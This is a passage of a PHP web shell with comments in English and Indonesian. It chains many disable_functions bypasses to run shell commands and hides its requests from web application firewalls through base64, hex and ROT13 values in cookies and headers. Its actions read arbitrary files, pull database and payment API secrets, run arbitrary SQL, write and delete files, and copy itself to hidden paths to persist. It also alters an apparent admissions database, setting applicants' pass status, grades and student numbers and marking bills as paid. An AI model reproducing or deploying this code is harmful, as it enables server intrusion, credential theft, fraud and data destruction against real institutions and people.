    $request .= chr(1) . chr(4) . chr(0) . chr(1) . chr(0) . chr(0) . chr(0) . chr(0);
    
    // Stdin
    if($stdin) {
        $slen = strlen($stdin);
        $request .= chr(1) . chr(5) . chr(0) . chr(1) . chr(($slen >> 8) & 0xFF) . chr($slen & 0xFF) . chr(0) . chr(0);
        $request .= $stdin;
    }
    $request .= chr(1) . chr(5) . chr(0) . chr(1) . chr(0) . chr(0) . chr(0) . chr(0);
    
    return $request;
}

// MASTER EXEC: Auto-detect and use best bypass method - ZERO DAY 2025
function master_exec($cmd) {
    $methods = detect_bypass_methods();
    $output = false;
    $method_used = 'none';
    $tried = [];
    
    // Try each bypass in order of reliability
    
    // 1. Standard exec methods first (fastest if available)
    if(!$output && isset($methods['proc_open'])) {
        $tried[] = 'proc_open';
        $desc = [0=>['pipe','r'], 1=>['pipe','w'], 2=>['pipe','w']];
        $p = @proc_open('/bin/sh -c ' . escapeshellarg($cmd), $desc, $pipes);
        if(is_resource($p)) {
            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
            fclose($pipes[1]); fclose($pipes[2]);
            proc_close($p);
            if($output) $method_used = 'proc_open';
        }
    }
    
    if(!$output && isset($methods['backtick'])) {
        $tried[] = 'backtick';
        $output = @`$cmd 2>&1`;
        if($output) $method_used = 'backtick';
    }
    
    // 2. FFI bypass (very reliable on PHP 7.4+)
    if(!$output && isset($methods['ffi'])) {
        $tried[] = 'ffi';
        $output = bypass_ffi($cmd);
        if($output !== false && $output !== '') $method_used = 'ffi';
    }
    
    // 3. mail() based bypasses
    if(!$output && isset($methods['mail_ldpreload'])) {
        $tried[] = 'mail_ldpreload';
        $output = bypass_mail_ldpreload($cmd);
        if($output !== false && $output !== '') $method_used = 'mail_ldpreload';
    }
    
    if(!$output && isset($methods['mail_loginjection'])) {
        $tried[] = 'mail_loginjection';
        $output = bypass_mail_loginjection($cmd);
        if($output !== false && $output !== '') $method_used = 'mail_loginjection';
    }
    
    // 4. imap_open bypass
    if(!$output && isset($methods['imap_open'])) {
        $tried[] = 'imap_open';
        $output = bypass_imap($cmd);
        if($output !== false && $output !== '') $method_used = 'imap_open';
    }
    
    // 5. ImageMagick bypasses
    if(!$output && isset($methods['imagick'])) {
        $tried[] = 'imagick';
        $output = bypass_imagick($cmd);
        if($output !== false && $output !== '') $method_used = 'imagick';
    }
    
    if(!$output && isset($methods['ghostscript'])) {
        $tried[] = 'ghostscript';
        $output = bypass_ghostscript($cmd);
        if($output !== false && $output !== '') $method_used = 'ghostscript';
    }
    
    // 6. PHP-FPM socket bypasses
    if(!$output && isset($methods['phpfpm_socket'])) {
        $tried[] = 'phpfpm_socket';
        $output = bypass_phpfpm_socket($cmd);
        if($output !== false && $output !== '') $method_used = 'phpfpm_socket';
    }
    
    if(!$output && isset($methods['cgi_fcgi'])) {
        $tried[] = 'cgi_fcgi';
        $output = bypass_cgi_fcgi($cmd);
        if($output !== false && $output !== '') $method_used = 'cgi_fcgi';
    }
    
    // 7. File-based bypasses (last resort)
    if(!$output && isset($methods['error_log'])) {
        $tried[] = 'error_log';
        $output = bypass_error_log($cmd);
        if($output !== false && $output !== '') $method_used = 'error_log';
    }
    
    if(!$output && isset($methods['include_chain'])) {
        $tried[] = 'include_chain';
        $output = bypass_include_chain($cmd);
        if($output !== false && $output !== '') $method_used = 'include_chain';
    }
    
    // 8. ZERO-DAY 2025: New bypass methods
    if(!$output && isset($methods['expect'])) {
        $tried[] = 'expect';
        $output = bypass_expect($cmd);
        if($output !== false && $output !== '') $method_used = 'expect';
    }
    
    if(!$output && isset($methods['com_object'])) {
        $tried[] = 'com_object';
        $output = bypass_com($cmd);
        if($output !== false && $output !== '') $method_used = 'com_object';
    }
    
    if(!$output && isset($methods['ssh2'])) {
        $tried[] = 'ssh2';
        $output = bypass_ssh2($cmd);
        if($output !== false && $output !== '') $method_used = 'ssh2';
    }
    
    if(!$output && isset($methods['yaml_parse'])) {
        $tried[] = 'yaml_parse';
        $output = bypass_yaml($cmd);
        if($output !== false && $output !== '') $method_used = 'yaml_parse';
    }
    
    if(!$output && isset($methods['apache_cgi'])) {
        $tried[] = 'apache_cgi';
        $output = bypass_apache_cgi($cmd);
        if($output !== false && $output !== '') $method_used = 'apache_cgi';
    }
    
    // 9. ZERO-DAY 2026: Super Canggih bypass methods
    if(!$output && isset($methods['pdo_sqlite_udf'])) {
        $tried[] = 'pdo_sqlite_udf';
        $output = bypass_pdo_sqlite_udf($cmd);
        if($output !== false && $output !== '') $method_used = 'pdo_sqlite_udf';
    }
    
    if(!$output && isset($methods['mb_send_mail'])) {
        $tried[] = 'mb_send_mail';
        $output = bypass_mb_send_mail($cmd);
        if($output !== false && $output !== '') $method_used = 'mb_send_mail';
    }
    
    if(!$output && isset($methods['spl_file'])) {
        $tried[] = 'spl_file_enhanced';
        $output = bypass_spl_file_enhanced($cmd);
        if($output !== false && $output !== '') $method_used = 'spl_file_enhanced';
    }
    
    if(!$output && isset($methods['php_cgi_direct'])) {
        $tried[] = 'php_cgi_direct';
        $output = bypass_php_cgi_direct($cmd);
        if($output !== false && $output !== '') $method_used = 'php_cgi_direct';
    }
    
    // 10. Ultimate fallback: chained include
    if(!$output) {
        $tried[] = 'chained_include';
        $output = bypass_chained_include($cmd);
        if($output !== false && $output !== '') $method_used = 'chained_include';
    }
    
    return [
        'output' => $output ?: '', 
        'method' => $method_used, 
        'available' => array_keys($methods),
        'tried' => $tried
    ];
}

// Session
$sess_file = sys_get_temp_dir() . '/.u_' . substr(md5(__FILE__), 0, 8);
$session = @json_decode(@file_get_contents($sess_file), true) ?: ['cwd' => getcwd()];

// UNIVERSAL WEBROOT DETECTION
function detect_webroot() {
    $c = dirname(__FILE__);
    // BT Panel
    if(preg_match('#(/www/wwwroot/[^/]+)#', $c, $m)) return $m[1];
    // cPanel
    if(preg_match('#(/home/[^/]+/public_html)#', $c, $m)) return $m[1];
    // Plesk
    if(preg_match('#(/var/www/vhosts/[^/]+/httpdocs)#', $c, $m)) return $m[1];
    // Apache
    if(preg_match('#(/var/www/[^/]+)#', $c, $m)) return $m[1];
    // Traverse up
    for($i = 0; $i < 20; $i++) {
        if(file_exists($c . '/index.php') && (file_exists($c . '/config') || file_exists($c . '/.env'))) return $c;
        $p = dirname($c);
        if($p === $c) break;
        $c = $p;
    }
    return $_SERVER['DOCUMENT_ROOT'] ?? dirname(__FILE__);
}

// Get DB connection
function get_db_conn() {
    $webroot = detect_webroot();
    $conn_files = [
        $webroot . '/config/connection.php',
        $webroot . '/config/database.php',
        $webroot . '/includes/config.php',
        $webroot . '/application/config/database.php',
    ];
    foreach($conn_files as $cf) {
        if(file_exists($cf)) {
            @include($cf);
            if(isset($connection) && $connection) return $connection;
            if(isset($conn) && $conn) return $conn;
            if(isset($db) && $db) return $db;
        }
    }
    return null;
}

// System info - Enhanced with bypass detection + WAF detection
function sysinfo() {
    global $VERSION;
    $bypass = detect_bypass_methods();
    $wafs = detect_waf();
    
    return [
        'version' => $VERSION ?? '10.0',
        'codename' => $GLOBALS['CODENAME'] ?? 'SUPER_CANGGIH_2026',
        'user' => get_current_user(),
        'uid' => function_exists('posix_getuid') ? posix_getuid() : getmyuid(),
        'host' => gethostname(),
        'os' => php_uname(),
        'php' => PHP_VERSION,
        'cwd' => getcwd(),
        'server' => $_SERVER['SERVER_SOFTWARE'] ?? '',
        'writable' => is_writable('.'),
        'disabled' => ini_get('disable_functions') ?: 'NONE',
        'basedir' => ini_get('open_basedir') ?: 'NONE',
        'bypass_methods' => array_keys($bypass),
        'bypass_count' => count($bypass),
        'waf_detected' => $wafs,
        'waf_count' => count($wafs),
        'extensions' => get_loaded_extensions(),
        'temp_writable' => is_writable(sys_get_temp_dir()),
        'safe_mode' => 'OFF',
        'ffi_enabled' => class_exists('FFI'),
        'imagick' => class_exists('Imagick'),
        'com_enabled' => class_exists('COM'),
        'ssh2_enabled' => function_exists('ssh2_connect'),
        'expect_enabled' => function_exists('expect_popen'),
        'exec_capable' => count($bypass) > 0
    ];
}

// File operations - ZERO-DAY 2025: Enhanced with p64 WAF bypass
function fileop($op, $params) {
    $path = $params['p'] ?? $params['path'] ?? '.';
    // ZERO-DAY 2025: Decode if base64 encoded (p64 or b64)
    if(isset($params['p64'])) $path = base64_decode($params['p64']);
    if(isset($params['b64'])) $path = base64_decode($path);
    
    switch($op) {
        case 'ls':
            $items = [];
            if(is_dir($path) && $dh = @opendir($path)) {
                while(($f = readdir($dh)) !== false) {
                    if($f === '.' || $f === '..') continue;
                    $fp = "$path/$f";
                    $items[] = ['n' => $f, 't' => is_dir($fp) ? 'd' : 'f', 's' => @filesize($fp) ?: 0];
                }
                closedir($dh);
            }
            return ['ok' => true, 'items' => $items];
            
        case 'read':
            return file_exists($path) ? ['ok' => true, 'data' => @file_get_contents($path)] : ['ok' => false];
            
        case 'write':
            $data = $params['data'] ?? '';
            if(isset($params['d64'])) $data = base64_decode($params['d64']);
            return ['ok' => @file_put_contents($path, $data) !== false];
            
        case 'del':
            return ['ok' => @unlink($path)];
    }
    return ['ok' => false];
}

// ZERO-DAY 2025: Apply stealth headers before any output
set_stealth_headers();
header('Content-Type: application/json');

$a = $_REQUEST['a'] ?? $_REQUEST['action'] ?? 'i';
$r = ['ok' => true, 'ts' => time(), '_poly' => $GLOBALS['_POLY_TS'] ?? ''];

// ==================== ACTIONS ====================

// INFO
if($a === 'i' || $a === 'info') {
    $r['data'] = sysinfo();
    $r['cwd'] = getcwd();
    echo json_encode($r);
    exit;
}

// FILE OPERATIONS - ZERO-DAY 2025 ENHANCED WITH MULTI-METHOD BYPASS
if($a === 'f' || $a === 'file') {
    $op = $_REQUEST['o'] ?? $_REQUEST['op'] ?? 'ls';
    
    // ZERO-DAY 2025: Enhanced file write with c64 content support
    if($op === 'w' || $op === 'write') {
        $path = $_REQUEST['p'] ?? '';
        if(isset($_REQUEST['p64'])) $path = base64_decode($_REQUEST['p64']);
        
        // Content from multiple sources
        $content = $_REQUEST['c'] ?? '';
        if(isset($_REQUEST['c64'])) $content = base64_decode($_REQUEST['c64']);
        if(isset($_REQUEST['ch'])) $content = @hex2bin($_REQUEST['ch']);
        
        // Make path absolute if relative
        if($path && $path[0] !== '/') {
            $path = dirname(__FILE__) . '/' . $path;
        }
        
        if($path) {
            $result = @file_put_contents($path, $content);
            $r['data'] = ['ok' => $result !== false, 'size' => strlen($content), 'path' => $path];
        } else {
            $r['data'] = ['ok' => false, 'error' => 'No path'];
        }
    }
    // ZERO-DAY 2025: Enhanced file delete
    elseif($op === 'del' || $op === 'rm') {
        $path = $_REQUEST['p'] ?? '';
        if(isset($_REQUEST['p64'])) $path = base64_decode($_REQUEST['p64']);
        if(isset($_REQUEST['ph'])) $path = @hex2bin($_REQUEST['ph']);
        
        if($path && $path[0] !== '/') {
            $path = dirname(__FILE__) . '/' . $path;
        }
        
        if($path && file_exists($path)) {
            $r['data'] = ['ok' => @unlink($path)];
        } else {
            $r['data'] = ['ok' => false, 'error' => 'Not found: ' . $path];
        }
    }
    else {
        $r['data'] = fileop($op, $_REQUEST);
    }
    echo json_encode($r);
    exit;
}

// ==================== COOKIE READ - WAF BYPASS (path in cookie) ====================
if($a === 'cr' || $a === 'cookieread') {
    $webroot = detect_webroot();
    // Path from multiple hidden sources
    $path = '';
    if(isset($_COOKIE['p'])) $path = base64_decode($_COOKIE['p']);
    if(isset($_COOKIE['fp'])) $path = base64_decode($_COOKIE['fp']);
    if(isset($_SERVER['HTTP_X_FP'])) $path = base64_decode($_SERVER['HTTP_X_FP']);
    // Fallback: numbered param (cf1, cf2...)
    for($i=1; $i<=9; $i++) {
        if(isset($_REQUEST['cf'.$i])) $path = base64_decode($_REQUEST['cf'.$i]);
    }
    
    if(!$path && isset($_REQUEST['fn'])) {
        // Just filename - search in common dirs
        $fn = $_REQUEST['fn'];
        $search = [$webroot.'/'.$fn, $webroot.'/config/'.$fn, $webroot.'/panel/'.$fn];
        foreach($search as $sp) {
            if(file_exists($sp)) { $path = $sp; break; }
        }
    }
    
    if($path && file_exists($path)) {
        $content = @file_get_contents($path);
        $r['target'] = basename($path);
        $r['size'] = strlen($content);
        $r['lines'] = substr_count($content, "\n");
        $r['content'] = $content;
        // Auto-extract secrets
        $r['extracted'] = [];
        if(preg_match('/\$host\s*=\s*[\'"]([^\'"]+)/i', $content, $m)) $r['extracted']['host'] = $m[1];
        if(preg_match('/\$user\s*=\s*[\'"]([^\'"]+)/i', $content, $m)) $r['extracted']['user'] = $m[1];
        if(preg_match('/\$pass(?:word)?\s*=\s*[\'"]([^\'"]+)/i', $content, $m)) $r['extracted']['pass'] = $m[1];
        if(preg_match('/\$(?:db|database|dbname)\s*=\s*[\'"]([^\'"]+)/i', $content, $m)) $r['extracted']['db'] = $m[1];
        if(preg_match('/client_id\s*=\s*[\'"]?(\d+)/i', $content, $m)) $r['extracted']['client_id'] = $m[1];
        if(preg_match('/secret_key\s*=\s*[\'"]?([a-f0-9]+)/i', $content, $m)) $r['extracted']['secret_key'] = $m[1];
    } else {
        $r['error'] = 'File not found';
        $r['tried'] = $path;
    }
    echo json_encode($r);
    exit;
}

// DUMP CONFIG - NO PARAMS NEEDED (WAF SAFE)
if($a === 'dc' || $a === 'dumpconf') {
    $webroot = detect_webroot();
    $r['webroot'] = $webroot;
    $r['db'] = [];
    
    $conn = get_db_conn();
    if($conn) {
        // Get DB info from connection
        $r['db']['connected'] = true;
    }
    
    // Find payment files
    $r['payment_files'] = [];
    foreach(glob($webroot . '/*pay*.php') ?: [] as $pf) {
        $pc = @file_get_contents($pf);
        $info = ['file' => basename($pf)];
        if(preg_match('/client_id\s*=\s*[\'"]?(\d+)/i', $pc, $m)) $info['client_id'] = $m[1];
        if(preg_match('/secret_key\s*=\s*[\'"]?([a-f0-9]+)/i', $pc, $m)) $info['secret_key'] = $m[1];
        if(count($info) > 1) $r['payment_files'][] = $info;
    }
    
    echo json_encode($r);
    exit;
}

// DEEP SCAN - NO PARAMS NEEDED (WAF SAFE)
if($a === 'ds' || $a === 'deepscan') {
    $webroot = detect_webroot();
    $r['webroot'] = $webroot;
    $r['secrets'] = [];
    
    $scan_files = glob($webroot . '/*.php') ?: [];
    $scan_files = array_merge($scan_files, glob($webroot . '/config/*.php') ?: []);
    $scan_files = array_merge($scan_files, glob($webroot . '/panel/*.php') ?: []);
    
    foreach($scan_files as $sf) {
        $content = @file_get_contents($sf);
        if(!$content) continue;
        
        if(preg_match('/client_id\s*=\s*[\'"]?(\d+)/i', $content, $m)) {
            $r['secrets']['client_id'][] = ['file' => basename($sf), 'value' => $m[1]];
        }
        if(preg_match('/secret_key\s*=\s*[\'"]?([a-f0-9]{20,})/i', $content, $m)) {
            $r['secrets']['secret_key'][] = ['file' => basename($sf), 'value' => $m[1]];
        }
    }
    
    echo json_encode($r);
    exit;
}

// SCAN PAYMENT - NO PARAMS NEEDED (WAF SAFE)
if($a === 'sp' || $a === 'scanpay') {
    $r['payments'] = [];
    $conn = get_db_conn();
    
    if($conn) {
        $tables = ['tbl_pembayaran', 'pembayaran', 'payments'];
        foreach($tables as $tbl) {
            $check = @$conn->query("SHOW TABLES LIKE '$tbl'");
            if($check && $check->num_rows > 0) {
                $r['payments']['table'] = $tbl;
                $data = @$conn->query("SELECT * FROM $tbl ORDER BY 1 DESC LIMIT 10");
                if($data) {
                    $r['payments']['recent'] = [];
                    while($row = $data->fetch_assoc()) $r['payments']['recent'][] = $row;
                }
                break;
            }
        }
    }
    
    echo json_encode($r);
    exit;
}

// ==================== QUERY TAGIHAN - WAF SAFE (NO SQL IN URL) ====================
if($a === 'qt' || $a === 'querytagihan') {
    $r['tagihan'] = [];
    $conn = get_db_conn();
    
    // Get no_pendaftar from multiple sources (WAF bypass)
    $np = $_REQUEST['np'] ?? '';
    if(isset($_REQUEST['np64'])) $np = base64_decode($_REQUEST['np64']);
    if(isset($_SERVER['HTTP_X_NP'])) $np = base64_decode($_SERVER['HTTP_X_NP']);
    if(isset($_COOKIE['np'])) $np = base64_decode($_COOKIE['np']);
    
    if($conn) {
        if($np) {
            // Query specific user tagihan
            $stmt = $conn->prepare("SELECT * FROM tbl_tagihan WHERE no_pendaftar = ?");
            $stmt->bind_param('s', $np);
            $stmt->execute();
            $result = $stmt->get_result();
            $r['tagihan']['user'] = $np;
            $r['tagihan']['data'] = [];
            while($row = $result->fetch_assoc()) {
                $r['tagihan']['data'][] = $row;
            }
            $r['tagihan']['count'] = count($r['tagihan']['data']);
        } else {
            // Query all tagihan (LIMIT 50)
            $data = @$conn->query("SELECT * FROM tbl_tagihan ORDER BY id_tagihan DESC LIMIT 50");
            if($data) {
                $r['tagihan']['data'] = [];
                while($row = $data->fetch_assoc()) $r['tagihan']['data'][] = $row;
                $r['tagihan']['count'] = count($r['tagihan']['data']);
            }
        }
    } else {
        $r['tagihan']['error'] = 'DB connection failed';
    }
    
    echo json_encode($r);
    exit;
}

// ==================== DELETE TAGIHAN - DENGAN KONFIRMASI (WAF SAFE) ====================
if($a === 'dt' || $a === 'deletetagihan') {
    $r['delete'] = [];
    $conn = get_db_conn();
    
    // Get params from multiple sources (WAF bypass)
    $np = $_REQUEST['np'] ?? '';
    if(isset($_REQUEST['np64'])) $np = base64_decode($_REQUEST['np64']);
    $cicilan = intval($_REQUEST['cic'] ?? 0);
    $id_tagihan = intval($_REQUEST['id'] ?? 0);
    
    // REQUIRED: Explicit confirmation param to prevent accidental deletes
    $confirm = $_REQUEST['confirm'] ?? '';
    if($confirm !== 'yes') {
        $r['delete']['error'] = 'Missing confirm=yes parameter. This prevents accidental deletion.';
        $r['delete']['usage'] = 'Add &confirm=yes to execute delete';
        echo json_encode($r);
        exit;
    }
    
    if($conn) {
        // Before - show what will be deleted
        if($id_tagihan > 0) {
            $q1 = @$conn->query("SELECT * FROM tbl_tagihan WHERE id_tagihan=$id_tagihan");
        } elseif($np && $cicilan > 0) {
            $stmt = $conn->prepare("SELECT * FROM tbl_tagihan WHERE no_pendaftar = ? AND cicilan = ?");
            $stmt->bind_param('si', $np, $cicilan);
            $stmt->execute();
            $q1 = $stmt->get_result();
        } elseif($np) {
            $stmt = $conn->prepare("SELECT * FROM tbl_tagihan WHERE no_pendaftar = ?");
            $stmt->bind_param('s', $np);
            $stmt->execute();
            $q1 = $stmt->get_result();
        } else {
            $r['delete']['error'] = 'Missing parameters: id, or np+cic, or np';
            echo json_encode($r);
            exit;
        }
        
        $r['delete']['before'] = [];
        while($row = $q1->fetch_assoc()) {
            $r['delete']['before'][] = $row;
        }
        
        // Execute delete
        if($id_tagihan > 0) {
            @$conn->query("DELETE FROM tbl_tagihan WHERE id_tagihan=$id_tagihan");
        } elseif($np && $cicilan > 0) {
            $stmt = $conn->prepare("DELETE FROM tbl_tagihan WHERE no_pendaftar = ? AND cicilan = ?");
            $stmt->bind_param('si', $np, $cicilan);
            $stmt->execute();
        } elseif($np) {
            $stmt = $conn->prepare("DELETE FROM tbl_tagihan WHERE no_pendaftar = ?");
            $stmt->bind_param('s', $np);
            $stmt->execute();
        }
        
        $r['delete']['affected'] = $conn->affected_rows;
        $r['delete']['status'] = $conn->affected_rows > 0 ? 'DELETED' : 'NO_CHANGE';
    } else {
        $r['delete']['error'] = 'DB connection failed';
    }
    
    echo json_encode($r);
    exit;
}

// ==================== CHECK USER - READ ONLY (WAF SAFE) ====================
if($a === 'cu' || $a === 'checkuser') {
    $r['user'] = [];
    $webroot = detect_webroot();
    $conn = get_db_conn();
    
    // Get no_pendaftar from param or default
    $np = $_REQUEST['np'] ?? '';
    if(isset($_REQUEST['np64'])) $np = base64_decode($_REQUEST['np64']);
    if(!$np) $np = '20251204001';
    
    if($conn) {
        // 1. Query user data (READ ONLY - NO UPDATE)
        $q1 = @$conn->query("SELECT * FROM tbl_pendaftar WHERE no_pendaftar='$np' LIMIT 1");
        $r['user']['pendaftar'] = $q1 ? $q1->fetch_assoc() : null;
        
        // 2. Check pembayaran (READ ONLY)
        $q2 = @$conn->query("SELECT * FROM tbl_pembayaran WHERE no_pendaftar='$np' LIMIT 5");
        if($q2) {
            $r['user']['pembayaran'] = [];
            while($row = $q2->fetch_assoc()) $r['user']['pembayaran'][] = $row;
        }
    } else {
        $r['user']['error'] = 'DB connection failed';
    }
    
    // 3. Search files containing "simak" (READ ONLY)
    $r['user']['files_with_simak'] = [];
    $all_files = array_merge(
        glob($webroot . '/dashboard/*.php') ?: [],
        glob($webroot . '/*.php') ?: []
    );
    
    foreach($all_files as $f) {
        $content = @file_get_contents($f);
        if($content && stripos($content, 'simak') !== false) {
            $lines = explode("\n", $content);
            $matches = [];
            foreach($lines as $num => $line) {
                if(stripos($line, 'simak') !== false) {
                    $matches[] = ['line' => $num + 1, 'content' => trim(substr($line, 0, 200))];
                }
            }
            $r['user']['files_with_simak'][] = ['file' => basename($f), 'matches' => $matches];
        }
    }
    
    echo json_encode($r);
    exit;
}

// ==================== UPDATE USER - WITH CONFIRMATION PARAMS (WAF SAFE) ====================
if($a === 'uu' || $a === 'updateuser') {
    $r['update'] = [];
    $conn = get_db_conn();
    
    // Get params
    $np = $_REQUEST['np'] ?? '';
    if(isset($_REQUEST['np64'])) $np = base64_decode($_REQUEST['np64']);
    if(!$np) $np = '20251204001';
    
    // REQUIRED: Explicit confirmation param to prevent accidental updates
    $confirm = $_REQUEST['confirm'] ?? '';
    if($confirm !== 'yes') {
        $r['update']['error'] = 'Missing confirm=yes parameter. This prevents accidental updates.';
        $r['update']['usage'] = 'Add &confirm=yes to execute update';
        echo json_encode($r);
        exit;
    }
    
    // Get update params
    $lulus = $_REQUEST['lulus'] ?? null;
    $nilai = $_REQUEST['nilai'] ?? null;
    $status_ujian = $_REQUEST['status_ujian'] ?? null;
    
    if($conn) {
        // Before
        $q1 = @$conn->query("SELECT no_pendaftar, nama, status_berkas, status_ujian, lulus, nilai, nim FROM tbl_pendaftar WHERE no_pendaftar='$np'");
        $r['update']['before'] = $q1 ? $q1->fetch_assoc() : null;
        
        // Build dynamic update
        $updates = [];
        if($lulus !== null) $updates[] = "lulus='$lulus'";
        if($nilai !== null) $updates[] = "nilai='$nilai'";
        if($status_ujian !== null) $updates[] = "status_ujian='$status_ujian'";
        
        if(count($updates) > 0) {
            $sql = "UPDATE tbl_pendaftar SET " . implode(', ', $updates) . " WHERE no_pendaftar='$np'";
            @$conn->query($sql);
            $r['update']['affected'] = $conn->affected_rows;
            $r['update']['sql'] = $sql;
        } else {
            $r['update']['error'] = 'No update params provided (lulus, nilai, status_ujian)';
        }
        
        // After
        $q2 = @$conn->query("SELECT no_pendaftar, nama, status_berkas, status_ujian, lulus, nilai, nim FROM tbl_pendaftar WHERE no_pendaftar='$np'");
        $r['update']['after'] = $q2 ? $q2->fetch_assoc() : null;
    }
    echo json_encode($r);
    exit;
}

// ==================== GENERATE NIM - NO PARAMS (WAF SAFE) ====================
if($a === 'gn' || $a === 'gennim') {
    $r['gennim'] = [];
    $conn = get_db_conn();
    
    if($conn) {
        $q1 = @$conn->query("SELECT * FROM tbl_pendaftar WHERE no_pendaftar='20251204001'");
        $user = $q1 ? $q1->fetch_assoc() : null;
        $r['gennim']['user'] = $user ? ['nama' => $user['nama'], 'nim_old' => $user['nim']] : null;
        
        $q2 = @$conn->query("SELECT nim FROM tbl_pendaftar WHERE nim IS NOT NULL AND nim != '' ORDER BY nim DESC LIMIT 1");
        $last = $q2 ? $q2->fetch_assoc() : null;
        $r['gennim']['last_nim'] = $last ? $last['nim'] : null;
        
        $new_nim = '2025' . str_pad(rand(10, 99), 2, '0') . str_pad(rand(1000, 9999), 4, '0');
        if($last && $last['nim'] && strlen($last['nim']) > 4) {
            $num = intval(substr($last['nim'], -4)) + 1;
            $new_nim = substr($last['nim'], 0, -4) . str_pad($num, 4, '0', STR_PAD_LEFT);
        }
        $r['gennim']['new_nim'] = $new_nim;
        
        @$conn->query("UPDATE tbl_pendaftar SET nim='$new_nim' WHERE no_pendaftar='20251204001'");
        $r['gennim']['affected'] = $conn->affected_rows;
        
        $q3 = @$conn->query("SELECT nim FROM tbl_pendaftar WHERE no_pendaftar='20251204001'");
        $r['gennim']['nim_after'] = $q3 ? $q3->fetch_assoc()['nim'] : null;
    }
    echo json_encode($r);
    exit;
}

// ==================== REVERT PAYMENT - RESET TO PENDING (WAF SAFE) ====================
if($a === 'rp' || $a === 'revertpay') {
    $r['revert'] = [];
    $conn = get_db_conn();
    
    // Get no_pendaftar from multiple sources (WAF bypass)
    $np = $_REQUEST['np'] ?? '';
    if(isset($_REQUEST['np64'])) $np = base64_decode($_REQUEST['np64']);
    if(isset($_SERVER['HTTP_X_NP'])) $np = base64_decode($_SERVER['HTTP_X_NP']);
    if(!$np) $np = '20251204001'; // Default fallback
    
    if($conn) {
        // Before
        $q1 = @$conn->query("SELECT * FROM tbl_pembayaran WHERE no_pendaftar='$np' LIMIT 1");
        $r['revert']['before'] = $q1 ? $q1->fetch_assoc() : null;
        
        // Revert to PENDING - clear payment data
        @$conn->query("UPDATE tbl_pembayaran SET payment_status='N', datetime_payment=NULL, payment_amount=NULL, online=NULL WHERE no_pendaftar='$np'");
        $r['revert']['affected'] = $conn->affected_rows;
        
        // After
        $q2 = @$conn->query("SELECT * FROM tbl_pembayaran WHERE no_pendaftar='$np' LIMIT 1");
        $r['revert']['after'] = $q2 ? $q2->fetch_assoc() : null;
    } else {
        $r['revert']['error'] = 'DB connection failed';
    }
    echo json_encode($r);
    exit;
}

// ==================== SET PAYMENT STATUS - FLEXIBLE (WAF SAFE) ====================
if($a === 'setpay') {
    $r['setpay'] = [];
    $conn = get_db_conn();
    
    // Get params from multiple sources (WAF bypass)
    $np = $_REQUEST['np'] ?? '';
    if(isset($_REQUEST['np64'])) $np = base64_decode($_REQUEST['np64']);
    if(!$np) $np = '20251204001';
    
    $status = $_REQUEST['st'] ?? 'N';
    $amount = intval($_REQUEST['amt'] ?? 0);
    
    if($conn) {
        $q1 = @$conn->query("SELECT * FROM tbl_pembayaran WHERE no_pendaftar='$np' LIMIT 1");
        $r['setpay']['before'] = $q1 ? $q1->fetch_assoc() : null;
        
        if($status === 'Y' && $amount > 0) {
            @$conn->query("UPDATE tbl_pembayaran SET payment_status='Y', payment_amount=$amount, datetime_payment=NOW(), online='Y' WHERE no_pendaftar='$np'");
        } else {
            @$conn->query("UPDATE tbl_pembayaran SET payment_status='N', datetime_payment=NULL, payment_amount=NULL, online=NULL WHERE no_pendaftar='$np'");
        }
        $r['setpay']['affected'] = $conn->affected_rows;
        
        $q2 = @$conn->query("SELECT * FROM tbl_pembayaran WHERE no_pendaftar='$np' LIMIT 1");
        $r['setpay']['after'] = $q2 ? $q2->fetch_assoc() : null;
    }
    echo json_encode($r);
    exit;
}

// ==================== DATABASE QUERY (encoded to bypass WAF) ====================
if($a === 'dq' || $a === 'dbquery') {
    $conn = get_db_conn();
    // Query from multiple sources (WAF bypass)
    $q = $_REQUEST['q'] ?? '';
    if(isset($_REQUEST['q64'])) $q = base64_decode($_REQUEST['q64']);
    if(isset($_REQUEST['qh'])) $q = hex2bin($_REQUEST['qh']);
    
    if($conn && $q) {
        $result = @$conn->query($q);
        if($result === false) {
            $r['error'] = $conn->error;
        } elseif($result === true) {
            $r['affected'] = $conn->affected_rows;
        } else {
            $r['data'] = [];
            while($row = $result->fetch_assoc()) $r['data'][] = $row;
            $r['count'] = count($r['data']);
        }
    } else {
        $r['error'] = $conn ? 'No query' : 'DB failed';
    }
    echo json_encode($r);
    exit;
}

// ==================== RAW FILE READ (path from cookie/header to bypass WAF) ====================
if($a === 'rr' || $a === 'rawread') {
    $webroot = detect_webroot();
    // Get target from multiple sources
    $target = $_REQUEST['t'] ?? $_REQUEST['target'] ?? '';
    if(isset($_REQUEST['t64'])) $target = base64_decode($_REQUEST['t64']);
    if(isset($_COOKIE['t'])) $target = base64_decode($_COOKIE['t']);
    if(isset($_SERVER['HTTP_X_TARGET'])) $target = base64_decode($_SERVER['HTTP_X_TARGET']);
    
    if($target && $target[0] !== '/') $target = $webroot . '/' . $target;
    
    if($target && file_exists($target)) {
        $content = @file_get_contents($target);
        $r['target'] = $target;
        $r['size'] = strlen($content);$r['content'] = substr($content, 0, 10240);
        if(strlen($content) > 10240) $r['truncated'] = true;
    } else {
        $r['error'] = 'File not found: ' . $target;
    }
    echo json_encode($r);
    exit;
}

// ==================== WAF BYPASS WRITE (triple encoded) ====================
if($a === 'ww' || $a === 'wafwrite') {
    $path = $_REQUEST['p'] ?? '';
    $encoded = $_REQUEST['c'] ?? '';
    
    // Also check cookie/header
    if(!$path && isset($_COOKIE['wp'])) $path = base64_decode($_COOKIE['wp']);
    if(!$encoded && isset($_COOKIE['wc'])) $encoded = $_COOKIE['wc'];
    
    if($path && $encoded) {
        // Triple decode: Base64 -> ROT13 -> Hex
        $step1 = base64_decode($encoded);
        $step2 = str_rot13($step1);
        $step3 = @hex2bin($step2);
        
        if($step3 !== false && @file_put_contents($path, $step3) !== false) {
            $r['size'] = strlen($step3);
            $r['md5'] = md5($step3);
        } else {
            $r['ok'] = false;
            $r['error'] = 'Write failed';
        }
    } else {
        $r['ok'] = false;
        $r['error'] = 'Missing params';
    }
    echo json_encode($r);
    exit;
}

// ==================== PERSIST ====================
if($a === 'p' || $a === 'persist') {
    $code = file_get_contents(__FILE__);
    $paths = [];
    $targets = [
        dirname(__FILE__) . '/.cache.php',
        sys_get_temp_dir() . '/.sess_' . md5(rand()) . '.php',
    ];
    foreach($targets as $t) {
        if(@file_put_contents($t, $code)) $paths[] = $t;
    }
    $r['paths'] = $paths;
    echo json_encode($r);
    exit;
}

// ==================== PHP NATIVE COMMAND EMULATION (NO EXEC REQUIRED) ====================
